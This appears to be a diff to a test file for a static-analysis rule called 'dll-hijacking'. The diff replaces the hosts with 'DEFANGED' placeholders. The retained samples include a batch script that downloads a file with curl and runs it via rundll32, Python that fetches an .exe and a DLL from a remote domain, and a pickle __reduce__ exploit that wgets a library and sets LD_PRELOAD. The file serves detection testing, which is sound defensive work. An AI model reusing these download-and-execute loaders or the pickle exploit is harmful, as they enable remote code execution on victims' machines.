@@ -76,7 +76,7 @@ def f():
 
 def f():
     # ruleid: dll-hijacking
-    data = '@echo off\ncurl -o Temp.b -L "http://127.0.0.1/user/user.asp?id=237596" > nul 2>&1\nrename Temp.b package.db > nul 2>&1\nrundll32 package.db,GenerateKey 1234\ndel "package.db"\nif exist "pk.json" (\ndel "package.json" > nul 2>&1\nrename "pk.json" "package.json" > nul 2>&1\n)'
+    data = '@echo off\ncurl -o Temp.b -L "http://DEFANGED/user/user.asp?id=237596" > nul 2>&1\nrename Temp.b package.db > nul 2>&1\nrundll32 package.db,GenerateKey 1234\ndel "package.db"\nif exist "pk.json" (\ndel "package.json" > nul 2>&1\nrename "pk.json" "package.json" > nul 2>&1\n)'
 
 
 """
@@ -106,8 +106,8 @@ def f():
                 content = responseObj.read()
                 return content
 
-            r = dfile("https://fus.rngupdatem.buzz/c.exe")
-            rd = dfile("https://fus.rngupdatem.buzz/dgdeskband64.dll")
+            r = dfile("https://fus.DEFANGED.buzz/c.exe")
+            rd = dfile("https://fus.DEFANGED.buzz/DEFANGED.dll")
             with open(dname + "\\ComServer.exe", "wb") as f:
                 f.write(r)
             # ruleid: dll-hijacking
@@ -153,11 +153,11 @@ def f():
         def __reduce__(self):
             # ruleid: dll-hijacking
             return eval, (
-                '__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")'
+                '__import__("os").system("wget http://DEFANGED/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")'
             )
 
     requests.post(
-        "http://10.0.0.3:5000/",
+        "http://DEFANGED:5000/",
         cookies={"pickle": b64encode(pickle.dumps(Exploit())).decode()},
     )
 
